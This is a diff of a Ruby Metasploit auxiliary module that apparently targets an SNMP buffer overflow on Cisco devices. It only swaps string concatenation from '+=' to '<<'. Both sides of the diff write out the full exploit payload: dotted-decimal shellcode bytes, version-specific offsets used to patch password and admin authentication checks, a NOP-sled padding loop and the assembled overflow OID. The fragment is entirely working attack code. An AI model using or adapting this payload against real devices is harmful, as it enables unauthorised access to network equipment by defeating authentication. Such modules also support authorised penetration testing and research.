@@ -98,35 +98,35 @@ class MetasploitModule < Msf::Auxiliary
           pmcheck_bytes = @offsets[vers_string][5]
           admauth_bytes = @offsets[vers_string][8]
       end
-
+      
       preamble_snmp = ""
-      preamble_snmp += "49.219.49.246.49.201.49.192.96.49.210.128.197.16.128.194.7.4.125.80.187."
-      preamble_snmp += @offsets[vers_string][3]
-      preamble_snmp += ".205.128.88.187."
-      preamble_snmp += @offsets[vers_string][6]
-      preamble_snmp += ".205.128.199.5."
-      preamble_snmp += @offsets[vers_string][4]
-      preamble_snmp += "."
-      preamble_snmp += pmcheck_bytes
-      preamble_snmp += ".199.5."
-      preamble_snmp += @offsets[vers_string][7]
-      preamble_snmp += "."
-      preamble_snmp += admauth_bytes
-      preamble_snmp += ".97.104."
-      preamble_snmp += @offsets[vers_string][1]
-      preamble_snmp += ".128.195.16.191.11.15.15.15.137.229.131.197."
-      preamble_snmp += @offsets[vers_string][2]
-      preamble_snmp += ".195"
+      preamble_snmp << "49.219.49.246.49.201.49.192.96.49.210.128.197.16.128.194.7.4.125.80.187."
+      preamble_snmp << @offsets[vers_string][3]
+      preamble_snmp << ".205.128.88.187."
+      preamble_snmp << @offsets[vers_string][6]
+      preamble_snmp << ".205.128.199.5."
+      preamble_snmp << @offsets[vers_string][4]
+      preamble_snmp << "."
+      preamble_snmp << pmcheck_bytes
+      preamble_snmp << ".199.5."
+      preamble_snmp << @offsets[vers_string][7]
+      preamble_snmp << "."
+      preamble_snmp << admauth_bytes
+      preamble_snmp << ".97.104."
+      preamble_snmp << @offsets[vers_string][1]
+      preamble_snmp << ".128.195.16.191.11.15.15.15.137.229.131.197."
+      preamble_snmp << @offsets[vers_string][2]
+      preamble_snmp << ".195"
 
       wrapper = preamble_snmp
 
       wrapper_len = wrapper.split('.').length
-      wrapper += ".144" * (82 - wrapper_len)
+      wrapper << ".144" * (82 - wrapper_len)
 
       # cufwUrlfServerStatus
       head = "1.3.6.1.4.1.9.9.491.1.3.3.1.1.5."
 
-      head += "9.95"
+      head << "9.95"
       finder_snmp = "139.124.36.20.139.7.255.224.144"
 
       overflow = [head, wrapper, @offsets[vers_string][0], finder_snmp].join(".")
